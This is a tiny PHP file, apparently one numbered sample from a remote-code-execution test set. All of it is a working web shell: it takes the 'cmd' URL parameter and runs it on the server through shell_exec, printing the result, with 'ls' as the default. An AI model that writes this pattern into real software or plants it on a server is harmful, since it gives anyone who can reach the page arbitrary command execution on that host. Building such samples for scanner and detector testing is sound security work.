<?php
// RCE test variation #1259
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>